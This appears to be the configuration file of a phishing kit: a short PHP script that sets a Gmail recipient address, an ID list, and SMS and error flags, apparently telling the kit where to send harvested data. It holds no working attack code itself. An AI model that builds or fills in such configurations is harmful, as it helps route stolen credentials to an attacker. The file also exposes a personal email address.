<?php
$send = "zaxbilal90@gmail.com";
$user_ids=array("5269869327v");
$sms='1';
$error='1';
?>
